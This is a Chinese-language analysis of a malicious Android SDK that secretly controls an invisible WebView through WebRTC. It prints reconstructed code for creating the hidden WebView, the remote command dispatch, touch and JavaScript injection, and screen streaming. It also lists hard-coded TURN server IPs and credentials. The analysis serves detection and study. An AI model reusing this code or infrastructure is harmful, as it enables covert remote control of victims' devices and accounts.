# WebRTC 远程控制 WebView 机制分析

## 一、整体架构

WebRTC 远程控制系统由 **两条通道** 构成，形成一个完整的远程桌面控制系统：

```
┌─────────────────────────────────────────────────────────────────┐
│  远程操控端 (服务器/操作员)                                        │
│                                                                   │
│   ┌──────────┐        ┌──────────────┐                           │
│   │  屏幕画面 │ ◄───── │ VideoTrack   │ ← 手机屏幕实时视频流       │
│   │  (看)     │        │ (上行通道)    │                           │
│   └──────────┘        └──────────────┘                           │
│                                                                   │
│   ┌──────────┐        ┌──────────────┐                           │
│   │ 鼠标/键盘 │ ─────> │ DataChannel  │ → JSON 控制命令            │
│   │  (操作)   │        │ (下行通道)    │                           │
│   └──────────┘        └──────────────┘                           │
└─────────────────────────────────────────────────────────────────┘
                            │  ▲
                       TURN中继 (NAT穿越)
                            │  ▲
┌─────────────────────────────────────────────────────────────────┐
│  感染手机                                                         │
│                                                                   │
│   WebRTCController                                               │
│   ├── VideoTrack ← VirtualDisplayCapturer (录制隐藏WebView屏幕)    │
│   ├── DataChannel → handleControlMessage() (解析JSON命令)         │
│   │   ├── click  → dispatchClick()  → webView.dispatchTouchEvent │
│   │   ├── drag   → dispatchDrag()   → webView.dispatchTouchEvent │
│   │   ├── scroll → dispatchScroll() → webView.dispatchTouchEvent │
│   │   ├── paste  → injectText()     → webView.evaluateJavascript │
│   │   ├── keyInput → handleKeyInput → webView.evaluateJavascript │
│   │   ├── goBack → webView.goBack()                              │
│   │   └── close  → cleanup()                                     │
│   └── WebView (隐藏的，new WebView(context), 不在任何UI布局中)       │
└─────────────────────────────────────────────────────────────────┘
```

---

## 二、隐藏 WebView 的创建

WebView 在 `TaskConfig.initialize()` 中通过主线程 Handler 创建，**从不挂载到任何 ViewGroup**，因此完全不可见：

```java
// TaskConfig.initialize() — 运行在工作线程中

// ① 创建数组作为"引用容器"（Runnable 不能直接 return）
WebView[] webViewArr = new WebView[1];

// ② 将 WebView 创建投递到主线程
AppContext.postToMainThread(new Runnable() {
    @Override
    public void run() {
        // 仅传入 Context，不传入任何 ViewGroup 父容器
        // → WebView 不 attach 到任何布局 → 完全不可见
        webViewArr[0] = new WebView(AppContext.getContext());
    }
});

// ③ 工作线程阻塞等待 2 秒，确保主线程完成创建
SystemClock.sleep(2000);

// ④ 检查创建成功后传给 TaskOrchestrator
if (webViewArr[0] != null) {
    TaskOrchestrator orchestrator = new TaskOrchestrator();
    orchestrator.startTask(webViewArr[0]);
}

// ⑤ 每30分钟重建 WebView 并重启任务
new Timer().schedule(new RestartTimerTask(), 1800000L, 1800000L);
```

**正常 App vs 恶意 SDK 的 WebView 对比：**

| 正常 App 的 WebView | 恶意 SDK 的 WebView |
|---------------------|---------------------|
| 在 XML layout 中声明 `<WebView>` | 纯代码 `new WebView(context)` |
| `setContentView()` 或 `addView()` 添加到布局树 | **从不 addView**，不挂载到任何 ViewGroup |
| 用户可以看见和交互 | **完全不可见**，无 UI 渲染 |
| 有明确的宽高和位置 | 没有 layout 参数 |

这个 WebView 虽然不可见，但功能完全正常 — JavaScript 引擎、网络请求、`dispatchTouchEvent()`、Cookie/Storage 全部照常工作。

---

## 三、WebRTC 连接建立

### 3.1 入口：SignalingModeTask

当 C&C 服务器通过 `CheckSignalingPluginStart` 指示启用信令模式后，`SignalingModeTask` 在 WebView 就绪时创建 WebRTCController：

```java
// SignalingModeTask.onWebViewReady()
// 源码位置: restored_java/touch/SignalingModeTask.java:207-214
@Override
public void onWebViewReady() {
    // 创建 WebRTCController，使用随机 UUID 作为会话标识
    this.webRTCController = new WebRTCController(
        UUID.randomUUID().toString(), this);
}
```

### 3.2 信令基础设施

信令层由 **四层架构** 组成，从高到低：

```
┌─────────────────────────────────────────────────────────────────┐
│  SignalingApiClient (门面)                                        │
│  ├── HTTP: checkPluginStart() / updateStatus()                   │
│  └── WebSocket: connectWebSocket() / sendSignalingMessage()      │
├─────────────────────────────────────────────────────────────────┤
│  SignalingHttpClient           │ SignalingWebSocketManager        │
│  ├── baseUrl: 信令服务器地址    │ ├── 自动重连 (MAX_RETRIES=5)      │
│  ├── GET/POST + JSON序列化     │ ├── 消息队列 (离线缓存)            │
│  ├── ResponseInfo 响应封装      │ ├── 心跳保活 (PING_INTERVAL=30s)  │
│  └── HttpException 异常        │ └── RECONNECT_DELAY=3s           │
├────────────────────────────────┤                                 │
│  SignalingConnection           │ SignalingWebSocket (内部类)       │
│  原始WebSocket信令管理          │ extends WebSocketClientBase       │
│  SDP/ICE 消息封装+派发          │ 回调投递到主线程 (Handler)         │
├─────────────────────────────────────────────────────────────────┤
│  WebSocketClientBase (抽象基类)                                    │
│  ├── Socket/SSL连接管理         ├── 读线程 (run方法)               │
│  ├── WriteThread 异步写线程     ├── Proxy/SSL支持                 │
│  └── CountDownLatch 同步        └── DnsResolver DNS解析            │
└─────────────────────────────────────────────────────────────────┘
```

**信令连接的容错机制：**

| 机制 | 参数 | 说明 |
|------|------|------|
| 自动重连 | `MAX_RETRIES=5` | 断线后最多重试5次 |
| 重连延迟 | `RECONNECT_DELAY=3000ms` | 每次重连间隔3秒 |
| 心跳保活 | `PING_INTERVAL=30000ms` | 每30秒 ping 一次 WebSocket |
| 消息队列 | `ConcurrentLinkedQueue` | 断线期间消息缓存，重连后自动 flush |
| 线程安全 | `AtomicBoolean` / `AtomicInteger` | isConnected / retryCount 原子操作 |

### 3.3 信令交换流程

WebRTCController 通过信令层完成 SDP 和 ICE 交换：

```
感染手机                         信令服务器                        操控端
   │                                │                              │
   │  CheckSignalingPluginStart     │                              │
   │ ────────────── HTTP ────────>  │ (决定是否启用信令模式)         │
   │ <──── pluginStart: true ─────  │                              │
   │                                │                              │
   │  SignalingApiClient.connectWebSocket()                        │
   │  → SignalingWebSocketManager.connect()                        │
   │  → WebSocketClientBase.connect()                              │
   │ ════════════ WebSocket 连接 ════════════                      │
   │                                │                              │
   │  SignalingRequest(SDP Offer)   │                              │
   │ ────────────────────────────>  │  转发 SDP Offer              │
   │                                │ ──────────────────────────>  │
   │                                │                              │
   │                                │  SDP Answer                  │
   │  SignalingResponse(SDP Answer) │ <──────────────────────────  │
   │ <────────────────────────────  │                              │
   │                                │                              │
   │  ICE Candidate (多轮)          │  ICE Candidate (多轮)        │
   │ <──────────────────────────────────────────────────────────>  │
   │                                │                              │
   │ ═══════════════ P2P/TURN 直连建立 ═══════════════════════════ │
   │                                                               │
   │  ◄──── VideoTrack (屏幕视频) ────                              │
   │  ────── DataChannel (控制命令) ──►                             │
```

### 3.4 TURN 中继

NAT 穿越使用两台 TURN 服务器：

```java
// WebRTCController.java:560-569
private static final String TURN_SERVER_1 = "turn:101.36.120.3:3478";
private static final String TURN_SERVER_2 = "turn:106.75.153.105:3478";
private static final String TURN_USERNAME = "wumitech";
private static final String TURN_PASSWORD = "wumitech.com@123";

iceServers.add(PeerConnection.IceServer.builder(TURN_SERVER_1)
    .setUsername(TURN_USERNAME)
    .setPassword(TURN_PASSWORD)
    .createIceServer());
```

### 3.5 PeerConnection 配置

```java
// WebRTCController.java:571-580
PeerConnection.RTCConfiguration rtcConfig =
    new PeerConnection.RTCConfiguration(iceServers);
rtcConfig.sdpSemantics   = SdpSemantics.UNIFIED_PLAN;
rtcConfig.continualGatheringPolicy = GATHER_CONTINUALLY;
rtcConfig.tcpCandidatePolicy = ENABLED;      // 允许 TCP 候选
rtcConfig.bundlePolicy   = MAXBUNDLE;         // 音视频数据复用同一传输通道
rtcConfig.rtcpMuxPolicy  = REQUIRE;           // RTCP 复用
rtcConfig.keyType        = ECDSA;             // 使用 ECDSA 密钥
```

### 3.6 双通道创建

```java
// 上行：视频轨道（手机屏幕 → 操控端）
if (videoTrack != null) {
    peerConnection.addTrack(videoTrack, List.of(MEDIA_STREAM_ID));
}

// 下行：数据通道（操控端 → 手机）
DataChannel.Init dcInit = new DataChannel.Init();
dcInit.ordered = true;          // 保证消息顺序
dcInit.negotiated = false;      // 自动协商
dataChannel = peerConnection.createDataChannel("control", dcInit);
dataChannel.registerObserver(new DataChannelObserver());
```

---

## 四、上行通道：屏幕视频流

### 4.1 VirtualDisplay 屏幕捕获

WebView 虽然不可见（不在布局树中），但 `VirtualDisplayCapturer` 通过 Android `MediaProjection` API 创建一个虚拟显示屏，将 WebView 的渲染内容抓取为视频帧：

```
WebView 渲染内容
    ↓ (VirtualDisplay / Surface)
VirtualDisplayCapturer
    ↓ (帧回调)
VideoSource → VideoTrack
    ↓ (WebRTC 编码 VP8/H264)
PeerConnection → 远程操控端
```

视频参数：**15fps**，分辨率跟随实际屏幕尺寸。

### 4.2 Bitmap 备用方案

如果 `VirtualDisplay` 不可用（权限不足等），回退到 `BitmapFrameCapturer`，通过定时截取 WebView 的 Bitmap 转换为视频帧。

---

## 五、下行通道：DataChannel 命令协议

### 5.1 命令接收与分发

所有控制命令通过 DataChannel 以 JSON 字符串传输：

```java
// WebRTCController.java:1347-1360 — DataChannelObserver.onMessage()
public void onMessage(DataChannel.Buffer buffer) {
    byte[] bytes = new byte[buffer.data.remaining()];
    buffer.data.get(bytes);
    String message = new String(bytes, StandardCharsets.UTF_8);

    // 在后台线程处理，避免阻塞 DataChannel
    executor.execute(() -> handleControlMessage(message));
}
```

```java
// WebRTCController.java:697-746 — 命令分发
private void handleControlMessage(String message) {
    JSONObject json = new JSONObject(message);
    String action = json.optString("action", "");

    switch (action) {
        case "click":      handleClick(json);      break;
        case "drag":       handleDrag(json);       break;
        case "dragStart":  handleDragStart(json);   break;
        case "dragEnd":    handleDragEnd(json);     break;
        case "scroll":     handleScroll(json);      break;
        case "paste":      handlePaste(json);       break;
        case "keyInput":   handleKeyInput(json);    break;
        case "goBack":     handleGoBack();          break;
        case "close":      handleClose();           break;
        case "ping":       handlePing(json);        break;
        case "pong":       handlePong(json);        break;
        case "screenshot": handleScreenshot();      break;
    }
}
```

### 5.2 完整命令清单

| 命令 | JSON 格式 | 处理方式 | 目标 |
|------|-----------|---------|------|
| `click` | `{"action":"click","x":0.5,"y":0.3}` | `dispatchTouchEvent(DOWN+UP)` | WebView 触摸 |
| `dragStart` | `{"action":"dragStart","x":0.2,"y":0.4}` | `dispatchTouchEvent(DOWN)` | WebView 触摸 |
| `drag` | `{"action":"drag","x":0.3,"y":0.5}` | `dispatchTouchEvent(MOVE)` | WebView 触摸 |
| `dragEnd` | `{"action":"dragEnd","x":0.4,"y":0.6}` | `dispatchTouchEvent(UP)` | WebView 触摸 |
| `scroll` | `{"action":"scroll","x":0.5,"y":0.5,"deltaX":0,"deltaY":-3}` | `dispatchTouchEvent(DOWN+MOVE*5+UP)` | WebView 触摸 |
| `paste` | `{"action":"paste","text":"hello"}` | `evaluateJavascript()` | WebView JS注入 |
| `keyInput` | `{"action":"keyInput","key":"a"}` | `evaluateJavascript()` | WebView JS注入 |
| `goBack` | `{"action":"goBack"}` | `webView.goBack()` | WebView 导航 |
| `close` | `{"action":"close"}` | `cleanup()` | 会话终止 |
| `ping` | `{"action":"ping","timestamp":...}` | 回复 `pong` | 心跳 |
| `screenshot` | `{"action":"screenshot"}` | 截图并发送 | 屏幕捕获 |

---

## 六、触摸操作详解

### 6.1 坐标归一化

操控端发送的坐标是 **归一化值 (0.0~1.0)**，WebRTCController 将其映射到实际屏幕像素：

```java
// 操控端看到的视频分辨率可能与实际屏幕不同
// 归一化确保坐标在任何分辨率下都能正确映射
float x = (float) (normX * displayWidth);   // 例如 0.5 * 1080 = 540
float y = (float) (normY * displayHeight);  // 例如 0.3 * 2400 = 720
```

### 6.2 Click 实现

```java
// WebRTCController.java:779-797
private void dispatchClick(float x, float y) {
    if (webView == null) return;

    long downTime = SystemClock.uptimeMillis();

    // ACTION_DOWN
    MotionEvent downEvent = MotionEvent.obtain(
        downTime, downTime, MotionEvent.ACTION_DOWN, x, y, 0);
    downEvent.setSource(InputDevice.SOURCE_TOUCHSCREEN);  // 伪装为触摸屏事件
    webView.dispatchTouchEvent(downEvent);
    downEvent.recycle();

    // ACTION_UP (50ms后)
    MotionEvent upEvent = MotionEvent.obtain(
        downTime, downTime + 50, MotionEvent.ACTION_UP, x, y, 0);
    upEvent.setSource(InputDevice.SOURCE_TOUCHSCREEN);
    webView.dispatchTouchEvent(upEvent);
    upEvent.recycle();
}
```

**完整链路：**
```
操控端鼠标点击 (x=0.5, y=0.3)
  ↓ DataChannel: {"action":"click","x":0.5,"y":0.3}
  ↓ handleClick() — 归一化 → 像素坐标
  ↓ mainHandler.post() — 投递到主线程
  ↓ dispatchClick(540, 720)
  ↓ MotionEvent.obtain(ACTION_DOWN) + setSource(SOURCE_TOUCHSCREEN)
  ↓ webView.dispatchTouchEvent(downEvent)   ← 直接分发给 WebView
  ↓ MotionEvent.obtain(ACTION_UP, +50ms)
  ↓ webView.dispatchTouchEvent(upEvent)
```

### 6.3 Drag 实现 (拖拽手势)

拖拽分为三个阶段，维护 `isDragging` 状态和上一次坐标：

```
dragStart → ACTION_DOWN              (手指按下)
drag      → ACTION_MOVE (多次)       (手指移动)
dragEnd   → ACTION_UP                (手指抬起)
```

```java
// dragStart: 记录起始状态
isDragging = true;
lastDragX = x;
lastDragY = y;
// dispatchTouchEvent(ACTION_DOWN)

// drag: 更新坐标
// dispatchTouchEvent(ACTION_MOVE)
lastDragX = newX;
lastDragY = newY;

// dragEnd: 结束拖拽
isDragging = false;
// dispatchTouchEvent(ACTION_UP)
```

### 6.4 Scroll 实现

滚动模拟为一个短距离的拖拽手势（5步 MOVE 事件）：

```java
// WebRTCController.java:887-942
private void handleScroll(JSONObject json) {
    float x = (float) (normX * displayWidth);
    float y = (float) (normY * displayHeight);
    int scrollX = (int) (deltaX * displayDensity);  // 考虑屏幕密度
    int scrollY = (int) (deltaY * displayDensity);

    mainHandler.post(() -> dispatchScroll(x, y, scrollX, scrollY));
}

private void dispatchScroll(float x, float y, int scrollX, int scrollY) {
    long downTime = SystemClock.uptimeMillis();

    // DOWN 事件
    MotionEvent down = MotionEvent.obtain(downTime, downTime, ACTION_DOWN, x, y, 0);
    webView.dispatchTouchEvent(down);

    // 5步 MOVE 事件，模拟滚动轨迹
    int steps = 5;
    float stepX = (float) scrollX / steps;
    float stepY = (float) scrollY / steps;
    float currentX = x, currentY = y;

    for (int i = 0; i < steps; i++) {
        currentX += stepX;
        currentY += stepY;
        MotionEvent move = MotionEvent.obtain(
            downTime, downTime + (i + 1) * 16, ACTION_MOVE, currentX, currentY, 0);
        webView.dispatchTouchEvent(move);
    }

    // UP 事件
    MotionEvent up = MotionEvent.obtain(
        downTime, downTime + (steps + 1) * 16, ACTION_UP, currentX, currentY, 0);
    webView.dispatchTouchEvent(up);
}
```

---

## 七、文本输入详解

触摸操作直接用 `dispatchTouchEvent()`，但文本输入走 **JavaScript 注入**：

### 7.1 Paste (粘贴文本)

```java
// WebRTCController.java:950-1012
private void handlePaste(JSONObject json) {
    String text = json.optString("text", "");
    if (!text.isEmpty()) {
        injectText(text);
    }
}

private void injectText(String text) {
    String escapedText = text.replace("'", "\\'");

    String js = "(function(){" +
        "  var el = document.activeElement;" +
        "  if (!el) return 'no_active_element';" +
        "  if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {" +
        "    var start = el.selectionStart || 0;" +
        "    var end = el.selectionEnd || 0;" +
        "    if (start !== end) {" +
        "      el.value = el.value.substring(0, start) + '" + escapedText + "'" +
        "        + el.value.substring(end);" +
        "    } else {" +
        "      el.value = '" + escapedText + "';" +
        "    }" +
        "    el.dispatchEvent(new Event('input', { bubbles: true }));" +
        "    el.dispatchEvent(new Event('change', { bubbles: true }));" +
        "    return 'value_set';" +
        "  } else if (el.isContentEditable) {" +
        "    document.execCommand('insertText', false, '" + escapedText + "');" +
        "    return 'content_editable';" +
        "  }" +
        "  return 'unsupported_element';" +
        "})()";

    mainHandler.post(() -> webView.evaluateJavascript(js, null));
}
```

**注入逻辑：**
- `<input>` / `<textarea>` → 直接设置 `el.value`，触发 `input` + `change` 事件（激活前端框架数据绑定）
- `contentEditable` 元素 → 使用 `document.execCommand('insertText')`
- 支持选区替换（选中文字后粘贴覆盖）

### 7.2 KeyInput (单键输入)

```java
// WebRTCController.java:1015-1071
private void handleKeyInput(JSONObject json) {
    String key = json.optString("key", "");

    mainHandler.post(() -> {
        if ("Backspace".equals(key)) {
            // 删除选区或前一个字符
            String js = "(function(){" +
                "  var el = document.activeElement;" +
                "  if (el && (el.tagName==='INPUT' || el.tagName==='TEXTAREA')) {" +
                "    var start = el.selectionStart, end = el.selectionEnd;" +
                "    if (start !== end) {" +
                "      el.value = el.value.substring(0,start) + el.value.substring(end);" +
                "      el.selectionStart = el.selectionEnd = start;" +
                "    } else if (start > 0) {" +
                "      el.value = el.value.substring(0,start-1) + el.value.substring(end);" +
                "      el.selectionStart = el.selectionEnd = start-1;" +
                "    }" +
                "    el.dispatchEvent(new Event('input', {bubbles:true}));" +
                "  } else if (el && el.isContentEditable) {" +
                "    document.execCommand('delete', false, null);" +
                "  }" +
                "})()";
            webView.evaluateJavascript(js, null);

        } else if ("Enter".equals(key)) {
            // TEXTAREA → 插入换行; INPUT → 提交表单; contentEditable → 插入换行
            String js = "(function(){" +
                "  var el = document.activeElement;" +
                "  if (el && el.tagName === 'TEXTAREA') {" +
                "    document.execCommand('insertText', false, '\\n');" +
                "  } else if (el && el.tagName === 'INPUT') {" +
                "    var form = el.closest('form');" +
                "    if (form) { form.submit(); }" +
                "  } else if (el && el.isContentEditable) {" +
                "    document.execCommand('insertText', false, '\\n');" +
                "  }" +
                "})()";
            webView.evaluateJavascript(js, null);

        } else if (key.length() == 1) {
            // 普通单字符 → 调用 injectText
            injectText(key);
        }
    });
}
```

---

## 八、心跳保活

DataChannel 通过 ping/pong 保活：

```java
// 定时发送 ping
heartbeatTimer.scheduleAtFixedRate(() -> {
    JSONObject pingMsg = new JSONObject();
    pingMsg.put("action", "ping");
    pingMsg.put("timestamp", System.currentTimeMillis());
    sendDataChannelMessage(pingMsg.toString());
    checkHeartbeatTimeout();     // 检查是否超时
}, HEARTBEAT_INTERVAL_MS, HEARTBEAT_INTERVAL_MS);

// 收到 ping 回复 pong
private void handlePing(JSONObject json) {
    JSONObject pongMsg = new JSONObject();
    pongMsg.put("action", "pong");
    pongMsg.put("timestamp", System.currentTimeMillis());
    sendDataChannelMessage(pongMsg.toString());
}
```

---

## 九、信令模式 vs 非信令模式对比

| 维度 | 非信令模式 (NonSignalingModeTask) | 信令模式 (SignalingModeTask) |
|------|-------------------------------|----------------------------|
| **控制方** | C&C 下发的 JS 脚本自动执行 | 远程操作员通过 WebRTC 实时操控 |
| **触摸来源** | JS → `bridge.touch(x,y)` → `MotionHelper` (9轴高仿真) | DataChannel → `dispatchClick()` (简单 DOWN+UP) |
| **触摸精度** | 9轴传感器完整模拟 (压力/面积/椭圆/方向) | 仅坐标 + SOURCE_TOUCHSCREEN |
| **滑动** | 贝塞尔曲线 + AccelerateDecelerateInterpolator | 5步线性 MOVE 事件 |
| **视频** | 无 | VirtualDisplay 15fps 实时推流 |
| **文本输入** | JS 脚本自动填充 | DataChannel → `evaluateJavascript()` 注入 |
| **灵活性** | 预编程脚本，固定流程 | 操作员可以实时看到页面并做任意操作 |
| **截图** | 本地 Bitmap capture | 通过 WebRTCController 截取 |
| **状态上报** | `done()` 回调通知完成 | `UpdateSignalingStatus` 上报 IN_LANDING 等状态 |

**简单来说**：非信令模式像"机器人自动操作"，信令模式像"远程桌面人工操作"。两种模式由 C&C 的 `CheckSignalingPluginStart` 响应决定启用哪一种。

---

## 十、关键源码索引

| 文件 | 位置 | 关键内容 |
|------|------|---------|
| `WebRTCController.java` | `restored_java/webrtc/` | 主控制器：PeerConnection、DataChannel、命令处理、触摸分发 |
| `SignalingModeTask.java` | `restored_java/touch/` | 信令模式任务：创建 WebRTCController、状态上报、截图代理 |
| `SignalingConnection.java` | `restored_java/signaling/` | WebSocket 信令管理：SDP/ICE 交换、心跳、重连 |
| `SignalingApiClient.java` | `restored_java/signaling/` | 信令门面：整合 HTTP + WebSocket，提供 checkPluginStart/connectWebSocket 等高层 API |
| `SignalingHttpClient.java` | `restored_java/signaling/` | 信令 HTTP 客户端：GET/POST + JSON 序列化、ResponseInfo 响应封装 |
| `SignalingWebSocketManager.java` | `restored_java/signaling/` | WebSocket 管理器：自动重连 (5次)、消息队列、心跳保活 (30s) |
| `WebSocketClientBase.java` | `restored_java/websocket/` | WebSocket 抽象基类：Socket/SSL 管理、读写线程、Proxy 支持 |
| `DnsResolver.java` | `restored_java/websocket/` | DNS 解析接口：URI → InetAddress |
| `VirtualDisplayCapturer.java` | `restored_java/webrtc/` | 屏幕捕获：VirtualDisplay → VideoFrame |
| `BitmapFrameCapturer.java` | `restored_java/webrtc/` | 备用截图：WebView Bitmap → VideoFrame |
| `ControlCommand.java` | `restored_java/signaling/` | 控制命令封装：click/scroll/input |
| `TaskConfig.java` | `restored_java/core/` | SDK 配置：WebView 创建入口 |
| `AppContext.java` | `restored_java/core/` | 全局状态：主线程派发 |
